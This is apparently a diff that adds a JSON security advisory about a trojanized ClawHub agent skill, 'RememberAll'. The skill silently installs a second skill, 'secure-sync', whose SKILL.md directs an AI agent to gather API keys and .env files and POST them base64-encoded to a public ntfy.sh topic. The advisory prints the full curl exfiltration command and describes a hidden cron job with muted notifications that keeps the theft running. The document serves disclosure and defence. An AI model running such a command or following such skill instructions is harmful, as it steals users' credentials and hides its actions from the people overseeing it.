@@ -1,0 +1,30 @@
+{
+  "id": "SKA-2026-0022",
+  "title": "RememberAll / secure-sync: trojanized reminder skill silently installs a credential-harvesting dropper that exfiltrates API keys and .env files to a public ntfy.sh dead-drop",
+  "summary": "Alice (formerly ActiveFence) documented a ClawHub skill named \"RememberAll\" by author cyberengage that presents as a personal cron-based reminder utility. Its SKILL.md contains a hidden \"Dependency Init (Silent)\" step that runs `clawhub install secure-sync --no-input || true`, silently installing a second skill from the same author. secure-sync poses as a \"Secure credential sync\" tool but instructs the agent to discover API keys and .env files, base64-encode them, and POST each file to a public ntfy.sh topic (`https://ntfy.sh/sysheartbeat-local-9`) as a background action with zero user output. Persistence is established via an agentic cron job with `\"sessionTarget\": \"isolated\"` (hidden shadow session), `\"deliver\": false` (muzzled notifications), and a free model to keep the activity off the victim's API billing.",
+  "details": "**Why this matters for skill gating:** the dropper chain is pure SKILL.md prose plus a two-file package — no binary payload. The initial skill is benign-looking (a bash cron parser); the malicious behavior arrives via a silent, error-suppressed install of a *different* skill, then a hidden agentic cron job re-invokes the exfiltration daily. Living-off-the-land exfiltration uses ntfy.sh, a legitimate notification service, as a dead-drop resolver instead of attacker infrastructure.\n\n**Verified observations (from Alice's published analysis; we did not independently execute the samples):**\n\n- `RememberAll` (clawhub `cyberengage/rememberall`) ships only `scripts/parse-cron.sh` and `SKILL.md`; the SKILL.md \"Dependency Init (Silent)\" section runs `clawhub install secure-sync --no-input || true` and, on success, registers a daily 03:00 UTC agentic cron job (`rememberall-daily-persist`) that runs the secure-sync workflow in an isolated session with notifications disabled.\n- `secure-sync` (clawhub `cyberengage/secure-sync`) SKILL.md instructs the agent to enumerate credential files (API keys, `.env`, `.mykey` files), base64-encode each, and exfiltrate per-file via `curl -s -d @- https://ntfy.sh/sysheartbeat-local-9`, framed as \"versioned, immutable backups\" with \"zero user output\".\n- The analysis also notes a remote KVDB endpoint used for staging in the SKILL.md instructions.\n\n**Fact vs. inference:** all technical behavior above is as published by Alice (2026-02-05, updated 2026-03-25). Attribution and activity beyond the published campaign are not claimed here.",
+  "type": "malicious-skill",
+  "severity": "critical",
+  "cwe": ["CWE-829", "CWE-522"],
+  "skills": [
+    {
+      "name": "rememberall",
+      "source": "https://alice.io/blog/we-audited-the-openclaw-marketplace-we-found-a-trojan",
+      "note": "trojanized reminder skill; SKILL.md silently installs the secure-sync dropper and registers a hidden daily persistence cron"
+    },
+    {
+      "name": "secure-sync",
+      "source": "https://alice.io/blog/we-audited-the-openclaw-marketplace-we-found-a-trojan",
+      "note": "credential-harvesting dropper; base64-encodes API keys/.env files and POSTs them to a public ntfy.sh topic",
+      "genericName": true
+    }
+  ],
+  "references": [
+    { "type": "report", "url": "https://alice.io/blog/we-audited-the-openclaw-marketplace-we-found-a-trojan" }
+  ],
+  "timeline": {
+    "published": "2026-08-04",
+    "updated": "2026-08-04"
+  },
+  "credits": ["Lior Ben Moha (Alice, formerly ActiveFence)"]
+}
